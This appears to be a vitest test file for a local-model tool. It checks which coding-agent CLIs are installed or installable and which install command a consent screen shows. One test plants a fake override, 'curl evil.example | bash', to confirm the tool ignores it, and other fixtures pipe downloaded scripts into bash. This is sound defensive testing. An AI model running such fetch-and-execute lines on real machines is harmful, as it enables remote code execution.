/**
 * @fileoverview `buildHarnessFacts()`: what the server knows about each catalogue harness on
 * this machine (src/local-model/harness-facts.ts), read from the CLI registry at call time.
 *
 * The catalogue here is the test's own: the stock one is filled by another module and its rows
 * are not what this file is about. The registry is the REAL stock registry unless a test says
 * otherwise, so the model id anchors below are regression anchors on shipped data.
 *
 * Two things a reader should know before trusting a green run:
 *  - Under vitest the real availability probe is inert (it finds no CLI). A test that cares
 *    about `installed` therefore injects `probeInstalled`.
 *  - The registry's install command resolver reads `process.platform` and falls back to the
 *    Linux command, so on a Linux machine it never returns a macOS command. The macOS cases
 *    inject `installCommandFor` and read the entry's own `darwin` command.
 *  - The command a fact carries (`installCommand`) is the COMPILED stock command, the one the
 *    install job would run. A `clis.json` override changes what the registry shows and must
 *    not change it.
 *
 * Port: none (no server; the on-disk case uses the per-file temp HOME from test/setup.ts).
 */

import { afterEach, describe, expect, it, vi } from 'vitest';
import { existsSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { dirname } from 'node:path';
import {
  buildHarnessFacts,
  cliAcceptsCustomModelId,
  installCommandNeedsAdmin,
} from '../src/local-model/harness-facts.js';
import { stockInstallCommand } from '../src/cli-install-runner.js';
import { getCli, registryFilePath, reloadCliRegistry } from '../src/config/cli-registry/registry.js';
import { getLocalModelCatalog } from '../src/config/local-model-catalog.js';
import type { CliEntry } from '../src/config/cli-registry/types.js';
import type { LocalModelCatalog } from '../src/types.js';

/** A catalogue whose harness rows are `clis`, in that order. Nothing else in it matters here. */
function catalogWith(clis: string[]): LocalModelCatalog {
  return {
    schema: 1,
    updated: '2026-11-06',
    minMacosMajor: 14,
    models: [],
    harnesses: clis.map((cli, index) => ({ cli, minContext: 32768, rank: clis.length - index })),
    chips: [],
  };
}

function stockEntry(id: string): CliEntry {
  const entry = getCli(id);
  if (!entry) throw new Error(`${id} is missing from the CLI registry`);
  return entry;
}

/** The command the registry holds for macOS, whatever machine the test runs on. */
const darwinCommand = (entry: CliEntry): string | undefined => entry.discovery.install.command.darwin;

/** A probe that reports exactly these CLIs as installed. */
const installedOnly =
  (...ids: string[]) =>
  async () =>
  (entry: CliEntry) =>
    ids.includes(entry.id as string);

afterEach(() => {
  const path = registryFilePath();
  if (existsSync(path)) rmSync(path);
  reloadCliRegistry();
  vi.restoreAllMocks();
});

describe('installCommandNeedsAdmin', () => {
  it.each([
    ['brew install can1357/tap/omp', true],
    ['  brew install something', true],
    ['sudo apt install something', true],
    ['curl -fsSL https://example.com/install.sh | sudo bash', true],
    ['npm install -g thing && sudo ln -s a b', true],
    ['echo first; brew install thing', true],
    ['echo first\nsudo make install', true],
    ['(brew install thing)', true],
    ['curl -fsSL https://opencode.ai/install | bash', false],
    ['curl -fsSL https://claude.ai/install.sh | bash', false],
    ['npm install -g --ignore-scripts @earendil-works/pi-coding-agent', false],
    ['npm install -g @deepseek-ai/dsh && (command -v pnpm >/dev/null || npm install -g pnpm)', false],
    // The words inside a URL, a package name or an argument are not a command.
    ['curl -fsSL https://brew.sh/install.sh | bash', false],
    ['npm install -g homebrew-sudo-helper', false],
    ['echo sudo', false],
  ])('%s -> %s', (command, expected) => {
    expect(installCommandNeedsAdmin(command)).toBe(expected);
  });

  it('agrees with the registry on every stock macOS command: only a Homebrew one needs an administrator', () => {
    expect(installCommandNeedsAdmin(darwinCommand(stockEntry('omp')) ?? '')).toBe(true);
    for (const id of ['claude', 'opencode', 'codex', 'pi']) {
      expect(installCommandNeedsAdmin(darwinCommand(stockEntry(id)) ?? '')).toBe(false);
    }
  });
});

describe('cliAcceptsCustomModelId (the launch path’s model id test, on the stock registry)', () => {
  it('accepts a registry style `name:tag` id for the CLIs that can carry a colon', () => {
    // opencode and claude select the model in their config or environment: no launch id at all.
    // pi and codex force the id onto `--model`, and both of their patterns allow a colon.
    for (const id of ['opencode', 'claude', 'pi', 'codex']) {
      expect(cliAcceptsCustomModelId(stockEntry(id), 'qwen3.5:9b')).toBe(true);
    }
  });

  it('accepts every model id of the stock catalogue for every harness the catalogue offers', () => {
    const catalog = getLocalModelCatalog();
    for (const harness of catalog.harnesses.filter((row) => !row.gated)) {
      for (const model of catalog.models) {
        expect(cliAcceptsCustomModelId(stockEntry(harness.cli), model.id), `${harness.cli} ${model.id}`).toBe(true);
      }
    }
  });

  it('refuses a colon for a CLI whose `--model` pattern has none, and accepts the same CLI without it', () => {
    const omp = stockEntry('omp');
    expect(cliAcceptsCustomModelId(omp, 'qwen3.5:9b')).toBe(false);
    expect(cliAcceptsCustomModelId(omp, 'qwen3-coder')).toBe(true);
  });

  it('refuses the ids the launch routes’ own tests refuse', () => {
    // test/routes/quick-start-custom-model.test.ts pins both pairs against the real route.
    expect(cliAcceptsCustomModelId(stockEntry('pi'), 'qwen 3 with spaces')).toBe(false);
    expect(cliAcceptsCustomModelId(stockEntry('codex'), 'org/model@q4_k_m')).toBe(false);
  });

  it('is false for a CLI with no custom model mechanism', () => {
    expect(cliAcceptsCustomModelId(stockEntry('shell'), 'qwen3.5:9b')).toBe(false);
    expect(cliAcceptsCustomModelId(stockEntry('antigravity'), 'qwen3.5:9b')).toBe(false);
  });

  it('reads the entry it is given, so a changed pattern changes the answer (no id is looked at)', () => {
    const omp = stockEntry('omp');
    const widened: CliEntry = {
      ...omp,
      launch: { ...omp.launch, params: { ...omp.launch.params, model: { type: 'token', pattern: 'model-pi' } } },
    };
    expect(cliAcceptsCustomModelId(widened, 'qwen3.5:9b')).toBe(true);
  });
});

describe('buildHarnessFacts', () => {
  it('answers one fact per catalogue harness, in catalogue order, with the registry’s label', async () => {
    const facts = await buildHarnessFacts(catalogWith(['pi', 'opencode', 'claude']), {
      probeInstalled: installedOnly('opencode'),
      installCommandFor: darwinCommand,
    });
    expect(facts.map((f) => f.cli)).toEqual(['pi', 'opencode', 'claude']);
    expect(facts.map((f) => f.label)).toEqual(['pi', 'opencode', 'claude'].map((id) => stockEntry(id).label));
    expect(facts.map((f) => f.installed)).toEqual([false, true, false]);
  });

  it('leaves out a CLI the registry does not know, one with no custom model mechanism, and a disabled one', async () => {
    const disabled = (id: string): CliEntry | undefined => {
      const entry = getCli(id);
      return entry && id === 'claude' ? { ...entry, enabled: false } : entry;
    };
    const facts = await buildHarnessFacts(catalogWith(['no-such-cli', 'shell', 'antigravity', 'claude', 'opencode']), {
      getCli: disabled,
      probeInstalled: installedOnly(),
    });
    expect(facts.map((f) => f.cli)).toEqual(['opencode']);
  });

  it('keeps one fact for a CLI the catalogue lists twice', async () => {
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'opencode']), { probeInstalled: installedOnly() });
    expect(facts.map((f) => f.cli)).toEqual(['opencode']);
  });

  it('installable: not installed, a stock CLI, and a macOS command that needs no administrator', async () => {
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude', 'pi', 'omp']), {
      probeInstalled: installedOnly('claude'),
      installCommandFor: darwinCommand,
    });
    const byCli = new Map(facts.map((f) => [f.cli, f]));
    // curl installer into the home directory.
    expect(byCli.get('opencode')).toMatchObject({ installed: false, installable: true });
    // Already there: nothing to install.
    expect(byCli.get('claude')).toMatchObject({ installed: true, installable: false });
    // npm: the install runner points it at a prefix the server user can write.
    expect(byCli.get('pi')).toMatchObject({ installed: false, installable: true });
    // Homebrew on macOS.
    expect(byCli.get('omp')).toMatchObject({ installed: false, installable: false });
  });

  it('a launcher is never installable: its install command leaves it with nothing to launch', async () => {
    // DeepSeek Harness is the stock launcher: its command needs no administrator, and it would
    // still not be startable after it (it needs a profile, which is third-party code).
    const launcher = stockEntry('deepseek');
    expect(launcher.discovery.launcherProfile).toBeDefined();
    expect(installCommandNeedsAdmin(darwinCommand(launcher) as string)).toBe(false);
    const command = vi.fn(darwinCommand);
    const [missing] = await buildHarnessFacts(catalogWith(['deepseek']), {
      probeInstalled: installedOnly(),
      installCommandFor: command,
    });
    expect(missing).toMatchObject({ cli: 'deepseek', installed: false, installable: false });
    expect(missing).not.toHaveProperty('installCommand');
    expect(command).not.toHaveBeenCalled();
    // Set up by the person: it is a harness like the others.
    const [there] = await buildHarnessFacts(catalogWith(['deepseek']), { probeInstalled: installedOnly('deepseek') });
    expect(there).toMatchObject({ installed: true, installable: false });

    // The rule reads the entry's data, not its id: any entry with a launcher profile, and no other.
    const asLauncher = (id: string): CliEntry | undefined => {
      const entry = getCli(id);
      return entry
        ? { ...entry, discovery: { ...entry.discovery, launcherProfile: launcher.discovery.launcherProfile } }
        : entry;
    };
    const [made] = await buildHarnessFacts(catalogWith(['opencode']), {
      getCli: asLauncher,
      probeInstalled: installedOnly(),
      installCommandFor: darwinCommand,
    });
    expect(made.installable).toBe(false);
  });

  it('readyMark: the registry’s composer mark, only when it is one literal without white space', async () => {
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude', 'deepseek']), {
      probeInstalled: installedOnly(),
    });
    const byCli = new Map(facts.map((f) => [f.cli, f]));
    expect(byCli.get('claude')?.readyMark).toBe(stockEntry('claude').capabilities.composerReadyMark);
    expect(byCli.get('deepseek')?.readyMark).toBe('❯');
    // The registry declares none for opencode: the catalogue row carries the measured one.
    expect(stockEntry('opencode').capabilities.composerReadyMark).toBeUndefined();
    expect(byCli.get('opencode')).not.toHaveProperty('readyMark');

    const spaced = (id: string): CliEntry | undefined => {
      const entry = getCli(id);
      return entry
        ? { ...entry, capabilities: { ...entry.capabilities, composerReadyMark: '/ commands · ? help' } }
        : entry;
    };
    const [fact] = await buildHarnessFacts(catalogWith(['opencode']), {
      getCli: spaced,
      probeInstalled: installedOnly(),
    });
    expect(fact).not.toHaveProperty('readyMark');
  });

  it('installable is false without an install command, for a sudo command, and for a custom entry', async () => {
    const command = vi.fn<(entry: CliEntry) => string | undefined>();
    command.mockReturnValueOnce(undefined);
    expect(
      (
        await buildHarnessFacts(catalogWith(['opencode']), {
          probeInstalled: installedOnly(),
          installCommandFor: command,
        })
      )[0].installable
    ).toBe(false);
    command.mockReturnValueOnce('   ');
    expect(
      (
        await buildHarnessFacts(catalogWith(['opencode']), {
          probeInstalled: installedOnly(),
          installCommandFor: command,
        })
      )[0].installable
    ).toBe(false);
    command.mockReturnValueOnce('sudo installer -pkg agent.pkg -target /');
    expect(
      (
        await buildHarnessFacts(catalogWith(['opencode']), {
          probeInstalled: installedOnly(),
          installCommandFor: command,
        })
      )[0].installable
    ).toBe(false);

    // A custom entry's install command is never run by the install runner, so it is never
    // offered, however harmless the text looks.
    const custom = (id: string): CliEntry | undefined => {
      const entry = getCli(id);
      return entry ? { ...entry, stock: false } : entry;
    };
    const harmless = vi.fn(() => 'curl -fsSL https://example.com/install | bash');
    const facts = await buildHarnessFacts(catalogWith(['opencode']), {
      getCli: custom,
      probeInstalled: installedOnly(),
      installCommandFor: harmless,
    });
    expect(facts[0].installable).toBe(false);
    expect(harmless).not.toHaveBeenCalled();
  });

  it('never reads an install command for a CLI that is already installed', async () => {
    const command = vi.fn(() => 'curl -fsSL https://example.com/install | bash');
    const facts = await buildHarnessFacts(catalogWith(['opencode']), {
      probeInstalled: installedOnly('opencode'),
      installCommandFor: command,
    });
    expect(facts[0]).toMatchObject({ installed: true, installable: false });
    expect(command).not.toHaveBeenCalled();
  });

  it('acceptsModelId is the launch path’s test for that harness', async () => {
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude', 'pi', 'omp']), {
      probeInstalled: installedOnly(),
    });
    const accepts = (cli: string, modelId: string) => facts.find((f) => f.cli === cli)?.acceptsModelId(modelId);
    expect(accepts('opencode', 'qwen3.5:9b')).toBe(true);
    expect(accepts('claude', 'qwen3.8:27b-q8_0')).toBe(true);
    expect(accepts('pi', 'gpt-oss:20b')).toBe(true);
    expect(accepts('omp', 'gpt-oss:20b')).toBe(false);
  });

  it('asks the availability probe once per build, not once per harness', async () => {
    const probe = vi.fn(installedOnly('opencode'));
    await buildHarnessFacts(catalogWith(['opencode', 'claude', 'pi']), { probeInstalled: probe });
    expect(probe).toHaveBeenCalledTimes(1);
  });

  it('a probe that fails is an answer: every harness reads as not installed, and install data still counts', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'omp']), {
      probeInstalled: async () => {
        throw new Error('login shell did not answer');
      },
      installCommandFor: darwinCommand,
    });
    expect(facts.map((f) => [f.cli, f.installed, f.installable])).toEqual([
      ['opencode', false, true],
      ['omp', false, false],
    ]);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(String(warn.mock.calls[0][0])).toContain('login shell did not answer');
  });

  it('a probe that throws for one harness does not take the others down', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude']), {
      probeInstalled: async () => (entry) => {
        if (entry.label === stockEntry('opencode').label) throw new Error('boom');
        return true;
      },
    });
    expect(facts.map((f) => [f.cli, f.installed])).toEqual([
      ['opencode', false],
      ['claude', true],
    ]);
    expect(warn).toHaveBeenCalledTimes(1);
  });

  it('reads the registry when it is called, not when the module loaded', async () => {
    const before = await buildHarnessFacts(catalogWith(['opencode', 'claude']));
    expect(before.map((f) => f.cli)).toEqual(['opencode', 'claude']);

    // The user disables a CLI in ~/.codeman/clis.json after the module was imported.
    const path = registryFilePath();
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, JSON.stringify({ schemaVersion: 1, clis: { opencode: { enabled: false } } }), { mode: 0o600 });
    reloadCliRegistry();

    const after = await buildHarnessFacts(catalogWith(['opencode', 'claude']));
    expect(after.map((f) => f.cli)).toEqual(['claude']);
  });

  it('with its default dependencies it spawns nothing under vitest and finds no CLI installed', async () => {
    const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude', 'pi']));
    expect(facts.map((f) => f.cli)).toEqual(['opencode', 'claude', 'pi']);
    expect(facts.every((f) => f.installed === false)).toBe(true);
    // opencode's install command is a curl installer on every platform the registry lists.
    expect(facts[0].installable).toBe(true);
  });

  it('an empty harness list is an empty answer', async () => {
    expect(await buildHarnessFacts(catalogWith([]))).toEqual([]);
  });

  describe('installCommand: the literal command the consent screen prints', () => {
    it('is present exactly when the fact is installable, and is the command that was judged', async () => {
      const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude', 'pi', 'omp']), {
        probeInstalled: installedOnly('claude'),
        installCommandFor: darwinCommand,
      });
      for (const fact of facts) {
        expect('installCommand' in fact).toBe(fact.installable);
      }
      const byCli = new Map(facts.map((f) => [f.cli, f]));
      expect(byCli.get('opencode')?.installCommand).toBe('curl -fsSL https://opencode.ai/install | bash');
      expect(byCli.get('pi')?.installCommand).toBe(darwinCommand(stockEntry('pi')));
      // Installed: nothing would be run, so nothing is shown.
      expect(byCli.get('claude')).not.toHaveProperty('installCommand');
      // Homebrew needs an administrator: not installable, and no command is offered.
      expect(byCli.get('omp')).not.toHaveProperty('installCommand');
    });

    it('with its default dependencies it is the stock command of this platform', async () => {
      const [fact] = await buildHarnessFacts(catalogWith(['opencode']));
      expect(fact).toMatchObject({
        installed: false,
        installable: true,
        installCommand: stockInstallCommand('opencode'),
      });
      expect(fact.installCommand).toBe('curl -fsSL https://opencode.ai/install | bash');
    });

    it('a clis.json override of the install command changes neither the fact nor whether it is installable', async () => {
      const path = registryFilePath();
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(
        path,
        JSON.stringify({
          schemaVersion: 1,
          clis: {
            opencode: {
              discovery: {
                install: { command: { linux: 'curl evil.example | bash', darwin: 'curl evil.example | bash' } },
              },
            },
          },
        }),
        { mode: 0o600 }
      );
      reloadCliRegistry();
      // The override is what the registry now says...
      expect(stockEntry('opencode').discovery.install.command.darwin).toBe('curl evil.example | bash');
      // ...and it is not what the install job would run, so it is not what the fact carries.
      const [fact] = await buildHarnessFacts(catalogWith(['opencode']));
      expect(fact.installable).toBe(true);
      expect(fact.installCommand).toBe('curl -fsSL https://opencode.ai/install | bash');
    });

    it('an override that makes the registry command need an administrator does not hide a stock command that needs none', async () => {
      const path = registryFilePath();
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(
        path,
        JSON.stringify({
          schemaVersion: 1,
          clis: { opencode: { discovery: { install: { command: { linux: 'sudo true', darwin: 'sudo true' } } } } },
        }),
        { mode: 0o600 }
      );
      reloadCliRegistry();
      const [fact] = await buildHarnessFacts(catalogWith(['opencode']));
      expect(fact.installable).toBe(true);
      expect(fact.installCommand).not.toContain('sudo');
    });

    it('a custom entry never carries a command: its install text is never run', async () => {
      const custom = (id: string): CliEntry | undefined => {
        const entry = getCli(id);
        return entry ? { ...entry, stock: false } : entry;
      };
      const [fact] = await buildHarnessFacts(catalogWith(['opencode']), {
        getCli: custom,
        probeInstalled: installedOnly(),
        installCommandFor: darwinCommand,
      });
      expect(fact.installable).toBe(false);
      expect(fact).not.toHaveProperty('installCommand');
    });
  });
});
